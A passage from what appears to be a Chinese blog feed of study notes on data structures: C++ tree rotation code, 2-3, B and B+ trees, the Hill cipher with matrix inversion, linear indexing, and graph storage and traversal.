class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//对以p为根的二叉排序树作右旋处理</span><br><span class="hljs-comment">//处理之后p指向新的树根结点，即旋转处理之前的左子树的根结点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">R_Rotate</span><span class="hljs-params">(BiTree *p)</span></span>&#123;<br>    BiTree L;<br>    L=(*p)-&gt;lchild;<br>    (*p)-&gt;lchild=L-&gt;rchild;<br>    L-&gt;rchild=(*p);<br>    *p=L;<br>&#125;<br></code></pre></td></tr></table></figure><p>当传入一个二叉排序树P，将它的左孩子定义为L，将L的右子树变成P的左子树，再将P改成L的右子树，最后将L替换P称为根结点，这样就完成了一次右旋操作。</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325201500807.png" alt="右旋"></p><p>左旋</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">L_Rotate</span><span class="hljs-params">(BiTree *p)</span></span>&#123;<br>    BiTree R;<br>    R=(*p)-&gt;rchild;<br>    (*p)-&gt;rchild=R-&gt;lchild; <span class="hljs-comment">//R的左子树挂接为P的右子树</span><br>    R-&gt;lchild=(*p);<br>    *p=R;<span class="hljs-comment">//P指向新的根结点</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="三、多路查找树（B树）"><a href="#三、多路查找树（B树）" class="headerlink" title="三、多路查找树（B树）"></a>三、多路查找树（B树）</h1><p>多路查找树，其每一个结点的孩子数可以多余两个，且每一个结点处可以存储多个元素。</p><p>它有四种特殊形式，<strong>2-3树，2-3-4树，B树，B+树</strong></p><h2 id="1-2-3树"><a href="#1-2-3树" class="headerlink" title="1. 2-3树"></a>1. 2-3树</h2><p><code>2-3树</code>是这样的一棵多路查找树：其中的每一个节点都具有两个孩子（我们称它为2结点）或三个孩子（我们称它为3结点）</p><p>一个2结点包含一个元素和两个孩子（或没有孩子），左子树包含的元素小于该元素，右子树包含的元素大于该元素。</p><p>一个3结点包含一大一小两个元素和三个孩子（或没有孩子）左子树包含小于较小元素的元素，右子树包含大于较大元素的元素，中间子树包含介于两元素之间的元素。</p><p><strong>2-3树所有叶子都在同一个层次</strong></p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326100958447.png" alt="2-3树"></p><h3 id="a-2-3树的插入实现"><a href="#a-2-3树的插入实现" class="headerlink" title="a. 2-3树的插入实现"></a>a. 2-3树的插入实现</h3><p>插入操作一定是发生在叶子结点上，2-3树插入一个元素的过程可能会对该树的其余节点产生连锁反应。</p><p>2-3树插入分为三种情况：</p><p>（1）对于空树，插入一个2结点即可</p><p>（2）插入结点到一个2结点的叶子上，应该说，由于其本身就只有一个元素，所以只需要将其升级到3结点即可</p><p>（3）要往3结点中插入一个新元素，因为3结点本身已经是2-3树的结点最大容量（已经有两个元素），因此就需要对其进行拆分，且将树中两元素或插入元素的三者中选择其一向上移动一层</p><p>对于（3）又有如下几种情况</p><blockquote><p>（1）如下图，插入元素5，经过遍历比较，5比8大，比4小，需要插入6,7元素的3结点位置，但是问题在于，6,7结点已经是3结点了，无法插入，此时发现4结点是个2结点，因此考虑将其升级为3结点，这样它就有三个孩子，于是让6,7结点拆分，让6与4结成3结点，将5成为它的中间孩子，将7成为它的右孩子</p></blockquote><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326103126134.png" alt="情况1"></p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326103403924.png" alt="情况1_solution"></p><blockquote><p>（2）如下图，我们需要向左图中插入元素11，经过遍历可得到元素11比12、14小，比9、10大，因此它应该是插入在拥有9,10元素的3结点位置。同理，9和10结点不能再增加结点。此时发现它的双亲结点12、14也是一个3结点，也不能插入元素了，再往上看，12,14的双亲结点，结点8是2结点。于是就想到，将9,10拆分，12,14也拆分，让根结点8升级为3结点</p></blockquote><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326103812235.png" alt="情况2"></p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326103821684.png" alt="情况2_solution"></p><blockquote><p>（3）如下图插入元素2，2比4小，所以应该插入1,3元素的3结点位置，往上看都是3结点的，都无法拆分了，那意味着当前我们的树结构是三成已经不能满足当前结点增加的需要了，于是将1,3拆分，4,6拆分，连根结点8,12也拆分，最终形成最后的结果</p></blockquote><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326105004561.png" alt="情况3"></p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326105309322.png" alt="情况3_solution"></p><p>如果2-3树插入的传播效应导致了根结点的拆分，则树的高度就会增加</p><h3 id="b-2-3树的删除操作"><a href="#b-2-3树的删除操作" class="headerlink" title="b. 2-3树的删除操作"></a>b. 2-3树的删除操作</h3><p>同样也分为三种情况</p><p>（1）所删除元素位于一个3结点的叶子结点上，直接将该结点处删除该元素即可，不会影响到整棵树的其他结点结构</p><p>（2）所删除元素位于一个2结点上，需要保证结点的定义未被改变</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326105912427.png" alt></p><p>需要分情况来处理</p><p>a. 此结点的双亲也是2结点，且拥有一个3结点的右孩子，如下，只需要删除结点1，然后左旋即可</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326110305069.png" alt></p><p>b. 此结点的双亲是2结点，它的右孩子也是2结点，这样如果直接左旋会造成没有右孩子，所以需要对整棵树进行变形，先把7结点变成3结点，然后再左旋</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326110551430.png" alt></p><p>c. 此结点的双亲是一个3结点，此时删除结点10，意味着双亲12，14这个结点不能成为3结点了，于是进行拆分，并将12与13合并成为左孩子</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326113053344.png" alt></p><p>d. 如果当前树是一个满二叉树，此时删除任何一个叶子都会使得整棵树不能满足2-3树的定义，如下图</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326113343137.png" alt></p><p>（3）所删除的元素位于非叶子的分支结点，此时我们通常是将树按中序遍历后得到此元素的前驱或后继元素，考虑让其补位即可</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326113518203.png" alt></p><h2 id="2-2-3-4树"><a href="#2-2-3-4树" class="headerlink" title="2. 2-3-4树"></a>2. 2-3-4树</h2><p>他就是2-3树的概念扩展，包括了4结点的使用，1个4结点包含小中大三个元素和四个孩子，一个4结点要么没有孩子，要么具有4个孩子，如果某个4结点有孩子的话，左子树包含小于最小元素的元素；第二子树包含大于最小元素，小于第二元素的元素，第三子树包含大于第二元素，小于最大元素的元素，右子树包含大于最大元素的元素</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230326162510200.png" alt="2-3-4树"></p><h2 id="3-B树"><a href="#3-B树" class="headerlink" title="3. B树"></a>3. B树</h2><p>我们的数据量达到了亿级别，主存中根本存不下，我们只能以块的形式从磁盘读取数据，与主存的访问时间相比，磁盘的 I/O 操作相当耗时，而提出 B-树的主要目的就是减少磁盘的 I/O 操作。B树是一种平衡的多路查找树，2-3树和2-3-4树都是B树的特例。结点最大的孩子数目称为B树的阶，因此2-3树是3阶B树，2-3-4树是4阶B树</p><p>一个m阶的B树具有如下属性：</p><p>（1）所有的叶子结点都出现在同一层上，并且不带信息(可以看做是外部结点或查找失败的结点，实际上这些结点不存在，指向这些结点的指针为空)。</p><p>（2）每个结点包含的关键字个数有上界和下界。用一个被称为 B 树的 <strong>最小度数</strong> 的固定整数 t ≥2 来表示这些界 ，其中 t 取决于磁盘块的大小：</p><blockquote><p>a. 除根结点以外的每个结点必须至少有 t−1 个关键字。因此，除了根结点以外的每个内部结点有 t 个孩子。如果树非空，根结点至少有一个关键字。</p><p>b. 每个结点至多包含2t-1个关键字</p></blockquote><p>（3）一个包含x个关键字的结点有x+1个孩子</p><p>（4）一个结点中所有关键字升序排列，两个关键字K~1~ 和 K~2~ 之间的孩子结点的所有关键字 key 在 (K~1~，K~2~) 的范围之内。</p><p>（5）与二叉排序树不同， B树的搜索是从根结点开始，根据结点的孩子树做多路分支选择，而二叉排序树做的是二路分支选择，每一次判断都会进行一次磁盘 I/O操作。</p><p>（6）与其他平衡二叉树类似，B树查找、插入和删除操作的时间复杂度为 O(log⁡ n) 量级。</p><p><strong>B树是怎么做到较少内存与外村交换数据次数的？</strong></p><p>外存比如硬盘，是将所有的信息分割成相等大小的页面，每次硬盘读写的都是一个或者多个完整的页面，对于一个硬盘来说，一页的长度可能是211或214字节。</p><p>在一个典型的B树应用中，要处理的硬盘数据量很大，因此无法一次全部装入内存，因此我们会对B树进行调整，使得B树的阶与硬盘存储的页面大小匹配。比如，一棵B树的阶为1001，高度为2，他可以存储超过10亿个关键字，我们只需要让根结点持久地保留在内存中，那么在这棵树上，需寻找某一个关键字至多两次的硬盘读取即可。</p><p>正是因为B树每结点可以具有比二叉树多得多的元素，所以与二叉树的操作不同，它们减少必须访问结点和数据块的数量，从而提高了性能</p><h2 id="4-B-树"><a href="#4-B-树" class="headerlink" title="4. B+树"></a>4. B+树</h2><p>假设B树的每一个节点都在硬盘不同的页上，我们为了遍历所有的元素，需要进行多次的I/O访问，为了保证每个元素只访问一次，引入了B+树。</p><p>在B树中，每一个元素在该树中只出现一次，有可能在叶子结点上，也有可能在分支结点上，而在B+树中，出现在分支结点中的元素会被当做他们在该分支结点位置的中序后继者中再次列出，另外，每一叶子结点都会保存一个指向后一叶子结点的指针。</p><p>（1）所有数据记录都存储在B+树的叶子节点上，非叶子结点只存储关键字信息，不存储数据记录</p><p>（2）叶子结点之间通过指针连接成一个有序链表，可以方便地进行范围查询</p><p>（3）所有叶子结点的深度相同，可以保证在最坏情况下查询的时间复杂度为O（logn）</p><p>B+树的结构包括根结点，非叶子结点和叶子结点</p><p>根结点：B+树的根结点可以使一个非叶子结点或一个叶子结点</p><p>非叶子结点：非叶子结点包含一个关键字数组和指针数组，关键字数组是按照从小到大的顺序存储的，指针数组中的每一个指针都指向一个子树，子树中所有关键字都大于上一个结点的关键字，小于下一个结点的关键字</p><p>叶子结点：叶子结点包含一个关键字数组和一个指针数组，关键字数组是按照从小到大的顺序存储的，每个关键字对应一个数据记录，叶子结点之间通过指针连接成一个有序链表</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hill密码</title>
    <link href="/2023/03/23/Hill%E5%AF%86%E7%A0%81/"/>
    <url>/2023/03/23/Hill%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Hill密码"><a href="#Hill密码" class="headerlink" title="Hill密码"></a>Hill密码</h1><p>Hill密码是一种多字母代替密码，Hill密码要求首先将明文分成同等规模的若干个分组（最后一个分组可能涉及填充），每一个分组被整体加密变换；Hill密码属于分组加密算法</p><p>Hill密码算法的基本思想：将一个分组中的d个连续的明文字母通过线性变换转换为d个密文字母。这种代替由d个线性方程决定，其中每个字母被分配一个数值（0，1，…，25）。解密只需要做一次逆变换就可以了。密钥就是变换矩阵本身</p><p>即：</p><p>明文：m=m1m2…md</p><p>密文：c=Ek(m)=c1c2…cd</p><p>其中，</p><p><img src="/2023/03/23/Hill%E5%AF%86%E7%A0%81/image-20230324092845291.png" alt="计算方式"></p><p>写成矩阵形式：</p><p><img src="/2023/03/23/Hill%E5%AF%86%E7%A0%81/image-20230324092945307.png" alt="矩阵形式"></p><p><strong>例：p=hill，使用的密钥为：</strong></p><p><img src="/2023/03/23/Hill%E5%AF%86%E7%A0%81/image-20230324093017826.png" alt="密钥"></p><p><strong>1. 加密</strong></p><p>hill被数字化后的4个数字是：7,8,11,11</p><p>这里是规定的字母与数字的一个对应表：A—-&gt;0，B—-&gt;1……</p><p>所以：</p><p><img src="/2023/03/23/Hill%E5%AF%86%E7%A0%81/image-20230324093041512.png" alt="加密"></p><p>得到结果<strong>c=[9,8,8,24]</strong></p><p>如果采用<strong>明文*密钥</strong>的形式，则密钥矩阵有多少行，明文矩阵就有多少组，如上密钥矩阵有4行，所以明文矩阵有4组，每组1个</p><p><strong>2. 解密</strong></p><p>我们首先求出密钥矩阵K的逆矩阵为</p><p><img src="/2023/03/23/Hill%E5%AF%86%E7%A0%81/image-20230324093111277.png" alt="逆矩阵"></p><p>所以解密为：</p><p><img src="/2023/03/23/Hill%E5%AF%86%E7%A0%81/image-20230324093137616.png" alt="解密"></p><p>计算结果得：<strong>[7,8,11,11]</strong>，对应的明文为<strong>hill</strong></p><p>基于Hill密码加解密的长消息将被分组，分组的长度由密钥矩阵的维数决定</p><p><strong>3. 求逆矩阵</strong></p><p>求逆矩阵的方法有很多，这里只讲一种高斯消元法求逆矩阵</p><p>我们构造一个n×2n的增广矩阵（A，I~n~），然后用高斯消元法将这个增广矩阵化为最简形式（I~n~，A^-1^)，此时的增广部分就是A矩阵的逆矩阵，如果最后简化的左半部分矩阵不是单位矩阵，那么说明矩阵A不可逆</p><p>例：</p><p><img src="/2023/03/23/Hill%E5%AF%86%E7%A0%81/image-20230324093155638.png" alt="矩阵A"></p><p>我们构造增广矩阵：</p><p><img src="/2023/03/23/Hill%E5%AF%86%E7%A0%81/image-20230324093213784.png" alt="增广矩阵"></p><p>进行行变换，将矩阵A变化为单位矩阵，右边的单位矩阵做相同的变化，此时右边的矩阵就为矩阵A的逆矩阵，如果矩阵A无法变成单位矩阵的形式，则说明矩阵A不存在逆矩阵</p><p><img src="/2023/03/23/Hill%E5%AF%86%E7%A0%81/image-20230324093237924.png" alt="求得逆矩阵"></p><p>这仅仅只是求逆矩阵的一种方法，方法还有很多……</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>线性索引查找</title>
    <link href="/2023/03/22/%E7%BA%BF%E6%80%A7%E7%B4%A2%E5%BC%95%E6%9F%A5%E6%89%BE/"/>
    <url>/2023/03/22/%E7%BA%BF%E6%80%A7%E7%B4%A2%E5%BC%95%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="线性索引查找"><a href="#线性索引查找" class="headerlink" title="线性索引查找"></a>线性索引查找</h1><p>索引就是把一个关键字与它对应的记录相关联的过程，所谓线性索引就是将索引项集合组织为线性结构，也称为索引表。</p><p>这里介绍三种线性索引：<code>稠密索引</code>、<code>分块索引</code>和<code>倒排索引</code></p><h2 id="一、稠密索引"><a href="#一、稠密索引" class="headerlink" title="一、稠密索引"></a>一、稠密索引</h2><p>稠密索引是指在线性索引中，将数据集中的每个记录对应一个索引项</p><p><img src="/2023/03/22/%E7%BA%BF%E6%80%A7%E7%B4%A2%E5%BC%95%E6%9F%A5%E6%89%BE/image-20230322201047056.png" alt="稠密索引"></p><p>对于稠密索引的这个索引表来说，索引项一定是按照关键码有序的排列</p><p>时间复杂度：O(n)</p><h2 id="二、分块索引"><a href="#二、分块索引" class="headerlink" title="二、分块索引"></a>二、分块索引</h2><p>稠密索引因为索引项与数据集的记录个数相同，所以空间代价很大。为了减少索引项的个数，对数据集进行分块，使其分块有序，然后在对每一块建立一个索引项，从而减少索引项的个数。</p><p>分块有序，是把数据集的记录分成了若干块，并且这些块需要满足两个条件：</p><p>（1） <code>块内无序</code>，即每一块内的记录都不要求有序。如果能够做到有序对于查找来说更加理想。</p><p>（2）<code>块间有序</code>，例如，要求第二块所有记录的关键字均要大于第一块中的所有记录的关键字……</p><p>分块索引的索引项结构分三个数据项：</p><p>（1）<code>最大关键码</code>：存储每一块的最大关键字，这样的好处在于可以使在它之后的下一块中的最小关键字也能比这一块最大关键字要大</p><p>（2）存储了块中的记录个数，以便于循环时使用</p><p>（3）用于指向块首数据元素的指针，便于开始对这一块中的记录进行遍历</p><p><img src="/2023/03/22/%E7%BA%BF%E6%80%A7%E7%B4%A2%E5%BC%95%E6%9F%A5%E6%89%BE/image-20230322202002888.png" alt="分块索引"></p><p>在分块索引中查找，分两步进行：</p><p>（1）在分块索引表中查找要查关键字所在的块。由于分块索引表示块间有序的，因此很容易利用折半、插值等算法得到结果。</p><p>（2）根据块首指针找到相应的块，并在块中顺序查找关键码。此时只能顺序查找了</p><p>分块索引的平均查找长度。设n个记录的数据集被平均分成m块，每个块中有t条记录，显然n=m*t，在假设L~b~为查找索引表的平均查找长度，因为最好与最差的等概率原则，所以L~b~的平均长度为（m+1)/2</p><p>L~w~为块中查找记录的平均查找长度，同理可知它的平均查找长度为(t+1)/2</p><p>所以分块索引查找的平均长度为：L~b~+L~w~=1/2(n/t+t)+1</p><p>可见，最佳情况就是n/t=t的时候，时间复杂度为O(√n)</p><h2 id="三、倒排索引"><a href="#三、倒排索引" class="headerlink" title="三、倒排索引"></a>三、倒排索引</h2><p>普通的搜索算法，是从文档里搜索一个关键词（文档—&gt;关键词），而倒排索引是首先知道了每个关键词都出现在了哪些文档里，从关键词搜文档（关键词—&gt;文档）</p><p>倒排索引的好处</p><p>想象一个场景，你要对一个很大的文件搜索其中是否有一个关键词，常规的做法是遍历整个文档，那么如果关键词在文档最后，就会非常慢</p><p>倒排索引先记录了每个关键词出现在了哪些文档里，需要哪个关键词，把含有的文档直接拎出来就可以，这样就快多了</p><p><img src="/2023/03/22/%E7%BA%BF%E6%80%A7%E7%B4%A2%E5%BC%95%E6%9F%A5%E6%89%BE/image-20230322203623652.png" alt="倒排索引"></p><p>在这里这张单词表就是索引表，索引项的通用结构是：</p><p>（1）次关键码：例如上面的“英文单词”</p><p>（2）记录号表：例如上面的“文章编号”</p><p>其中记录号表存储具有相同次关键字的所有记录的记录号（可以使指向记录的指针或者是该记录的主关键字）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构--图</title>
    <link href="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/"/>
    <url>/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="数据结构—图"><a href="#数据结构—图" class="headerlink" title="数据结构—图"></a>数据结构—图</h1><h2 id="一、图的定义"><a href="#一、图的定义" class="headerlink" title="一、图的定义"></a>一、图的定义</h2><h3 id="1-1-顶点与边"><a href="#1-1-顶点与边" class="headerlink" title="1.1 顶点与边"></a>1.1 顶点与边</h3><p>图是由顶点的有穷非空集合和顶点之间边的集合组成，通常表示为：G(V，E)，其中，G表示一个图，V是图G中顶点的集合，E是图G中边的集合。</p><p><strong>无向边：</strong>若顶点vi到vj之间的边没有方向，则称这条边为无向边，用无序偶对(vi,vj)来表示</p><p>如果图中任意两个顶点之间的边都是无向边，则称这个图为无向图。</p><p><strong>有向边：</strong>若从顶点vi到vj的边有方向，则称这条边为有向边，也称为弧</p><p>无向边用小括号“（）”表示，而有向边则是用尖括号“&lt;&gt;”表示</p><p>在无向图中，如果任意两个顶点之间都存在边，则称该图为<strong>无向完全图</strong>。含有n个顶点的无向完全图有n×(n-1)/2条边</p><p>在有向图中，如果任意两个顶点之间都存在方向互为相反的两条弧，则称该图为有向完全图。含有n个顶点的有向完全图有n×(n-1)条边。</p><p>有很少条边或者弧的图称为<strong>稀疏图</strong>，反之称为<strong>稠密图</strong></p><p>有些图的边或弧具有与它相关的数字，这种与图的边或弧相关的数叫做权。<strong>带权的图通常称为网</strong>。</p><p>对于无向图G=（V,{E})，如果边（v,v’)∈E，则称顶点v和v’互为邻接点，即v和v’相邻接。边（v,v’)依附于顶点v和v’，或者说（v,v’)与顶点v和v‘相关联。<strong>顶点v的度是和v相关联的边的数目。</strong></p><p>以顶点v为头的弧的数目称为v的入度，记为ID(v)；</p><p>以v为尾的弧的数目称为v的出度，记为OD(v)</p><p>顶点v的度为TD(v)=ID(v)+OD(v)</p><p><strong>路径的长度是路径上的边或弧的数目</strong></p><p><strong>第一个顶点到最后一个顶点相同的路径称为回路或环</strong></p><p><strong>序列中顶点不重复出现的路径称为简单路径</strong></p><p>除了第一个顶点和最后一个顶点之外，其余顶点不重复出现的回路，称为简单回路或者简单环</p><h3 id="1-2-连通图"><a href="#1-2-连通图" class="headerlink" title="1.2 连通图"></a>1.2 连通图</h3><p>在无向图G中，如果顶点v到顶点v’有路径，则称v和v’是连通的。</p><p>如果对于图中任意两个顶点vi、vj∈E，vi和vj都是连通的，则称G是连通图</p><p><strong>连通分量</strong>：无向图中的极大连通子图称为连通分量</p><p>（1）要是子图</p><p>（2）子图要是连通的</p><p>（3）连通子图含有极大顶点数</p><p>（4）具有极大顶点数的连通子图包含依附于这些顶点的所有边</p><h2 id="二、图的存储结构"><a href="#二、图的存储结构" class="headerlink" title="二、图的存储结构"></a>二、图的存储结构</h2><h3 id="2-1-邻接矩阵"><a href="#2-1-邻接矩阵" class="headerlink" title="2.1 邻接矩阵"></a>2.1 邻接矩阵</h3><p>用两个数组来表示图，一个一维数据存储图中顶点信息，一个二维数组存储图中的边或弧的信息</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314212538963.png" alt="无向图邻接矩阵"></p><p>无向图的边数组是一个对称矩阵</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314212654932.png" alt="有向图邻接矩阵"></p><h3 id="2-2-邻接表"><a href="#2-2-邻接表" class="headerlink" title="2.2 邻接表"></a>2.2 邻接表</h3><p>领接矩阵的问题在于它对存储空间有极大的浪费，如下：</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314213010440.png" alt></p><p>所以：数组与链表相结合的存储方式—-邻接表</p><p>（1）图中顶点用一个一维数组存储，顶点也可以用单链表来存储。但是数据更加容易读取顶点信息，更加方便。另外对于顶点数组中，每个数组元素还需要存储指向第一个邻接点的指针，以便查找该顶点的边信息。</p><p>（2）图中的每个顶点V~i~的所有邻接点构成一个线性表，由于邻接点的个数不定，所以用单链表存储，无向图称为顶点V~i~的边表，有向图则称为顶点V~i~作为弧尾的出边表。</p><p>无向图邻接表</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314213616546.png" alt="无向图邻接表"></p><p>有向图邻接表</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314213727207.png" alt="有向图邻接表"></p><p>这样很容易确定每个顶点的出度，但是为了更加方便的确定顶点的入度，我们引入有向图的逆邻接表，即对每个顶点V~i~都建立一个链接为V~i~的表</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314214021296.png" alt="逆邻接表"></p><p>对于带权值的网图，可以在边表结点定义中再增加一个weight的数据域，存储权值信息即可</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314214136442.png" alt="带权图"></p><h3 id="2-3-十字链表"><a href="#2-3-十字链表" class="headerlink" title="2.3 十字链表"></a>2.3 十字链表</h3><p>将邻接表和逆邻接表结合起来—十字链表</p><p>顶点表结点结构</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314214725184.png" alt="顶点表结点结构"></p><p><strong>firstin表示入边表头指针，指向该顶点的入边表中第一个结点</strong></p><p><strong>firstout表示出边表头指针，指向该顶点的出边表中的第一个结点</strong></p><p>边表结点结构</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314214943293.png" alt="边表结点结构"></p><p><strong>tailvex是指弧起点在顶点表的下标</strong></p><p><strong>headvex是指弧终点在顶点表中的下标 </strong></p><p><strong>headlink是指入边表指针域，指向终点相同的下一条边</strong></p><p><strong>taillink是指边表指针域，指向起点相同的下一条边</strong></p><p>如果是网，还可以再增加一个<strong>weight</strong>域来存储权值</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314215514793.png" alt="十字链表"></p><p>如上图，以顶点V~0~为例，<strong>firstout</strong>指向的是出边表中的第一个结点V~3~，所以V~0~边表结点的headvex=3，而tailvex其实就是当前顶点V~0~的下标0，由于V~0~只有一个出边顶点，所以<strong>headlink</strong>和<strong>taillink</strong>都是空。</p><p>虚线箭头的含义：对于V~0~来说，它有两个顶点V~1~和V~2~的入边。因此V~0~的<strong>firstin</strong>指向顶点V~1~的边表结点中<strong>headvex</strong>为0的结点，如①</p><p>接着由入边结点的<strong>headlink</strong>指向下一个入边顶点V~2~，如图中的②</p><p>对于顶点V~1~,他有一个入边顶点V~2~，所以它的<strong>firstin</strong>指向顶点V~2~的边表结点中headvex为1的结点，如③</p><p>顶点V~2~和V~3~也是同样有一个入边顶点，如图④和⑤</p><h3 id="2-4-邻接多重表"><a href="#2-4-邻接多重表" class="headerlink" title="2.4 邻接多重表"></a>2.4 邻接多重表</h3><p>优化无向表的方案，邻接多重表</p><p>边表结点结构</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230314221055749.png" alt="边表结点结构"></p><p><strong>ivex</strong>和<strong>jvex</strong>是与某条边依附的两个顶点在顶点表中下标。</p><p><strong>ilink</strong>指向依附顶点<strong>ivex</strong>的下一条边，<strong>jlink</strong>指向依附顶点<strong>jvex</strong>的下一条边。</p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230315210434883.png" alt="邻接多重表"></p><p>①②③④是将顶点的firstedge指向一条边，顶点下标与ivex的值相同。</p><p>由于顶点V~0~的（V~0~，V~1~）边的邻边有(V~0~，V~3~)和（V~0~，V~2~）。因此⑤⑥的连线就是满足指向下一条依附于顶点V~0~的边的目标，注意<strong>ilink</strong>指向的结点的<strong>jvex</strong>一定要和它本身的<strong>ivex</strong>的值相同。其余线条同样的道理。</p><h3 id="2-5-边集数组"><a href="#2-5-边集数组" class="headerlink" title="2.5 边集数组"></a>2.5 边集数组</h3><p><strong>边集数组由两个一维数组构成。一个是存储顶点的信息；另一个是存储边的信息，这个边数组每个数据元素由一条边的起点下标，终点下标和权组成。</strong></p><p><img src="/2023/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%9B%BE/image-20230315211320079.png" alt="边集数组"></p><h2 id="三、图的遍历"><a href="#三、图的遍历" class="headerlink" title="三、图的遍历"></a>三、图的遍历</h2><p>从图中的某一个顶点出发访遍图中其余顶点，且使每一个顶点仅被访问一次，这一过程就叫做图的遍历</p><h3 id="3-1-深度优先遍历（DFS）"><a href="#3-1-深度优先遍历（DFS）" class="headerlink" title="3.1 深度优先遍历（DFS）"></a>3.1 深度优先遍历（DFS）</h3><p>图的深度优先搜索（Depth First Search，DFS）是一种用于遍历和搜索图的算法，它从图的某个顶点开始，尽可能深地探索图的分支，直到到达没有未探索过的邻接节点的顶点，然后回溯到前一个顶点，继续探索其他分支。DFS通常使用递归的方式实现，也可以使用栈的方式来实现。 DFS的算法步骤如下：</p><ol><li>从图中某个顶点开始遍历，将该顶点标记为已访问。</li><li>访问该顶点的所有未访问过的邻接点，对每个邻接点递归执行DFS算法。</li><li>如果所有邻接点都已被访问，则回溯到前一个顶点，继续执行DFS算法，直到所有顶点都被访问。</li></ol><p>DFS算法的时间复杂度为O(V+E)，其中V为顶点数，E为边数。由于DFS算法是一种深度优先的算法，因此它的空间复杂度比较高，当遍历的深度过大时，会占用大量的内存空间。为了避免这种情况的发生，可以使用迭代加深搜索或优化的DFS算法，例如剪枝、双向DFS等。</p><h3 id="3-2-广度优先遍历（BFS）"><a href="#3-2-广度优先遍历（BFS）" class="headerlink" title="3.2 广度优先遍历（BFS）"></a>3.2 广度优先遍历（BFS）</h3><p>图的广度优先搜索（Breadth First Search，BFS）是一种用于遍历和搜索图的算法，它从图的某个顶点开始，先访问该顶点的所有邻接点，然后再访问这些邻接点的所有邻接点，以此类推，直到所有顶点都被访问。BFS通常使用队列的方式实现。 BFS的算法步骤如下：</p><ol><li>选择一个顶点作为起点，并将其加入队列。</li><li>从队列中取出一个顶点，访问该顶点并将其标记为已访问。</li><li>访问该顶点的所有未访问过的邻接点，并将这些邻接点加入队列。</li><li>重复步骤2和步骤3，直到队列为空。 </li></ol><p>BFS算法的时间复杂度为O(V+E)，其中V为顶点数，E为边数。BFS算法的空间复杂度也比较高，因为需要使用队列来存储访问过的顶点，当图的顶点数较大时，会占用较多的内存空间。为了避免这种情况的发生，可以使用双向BFS等优化算法。 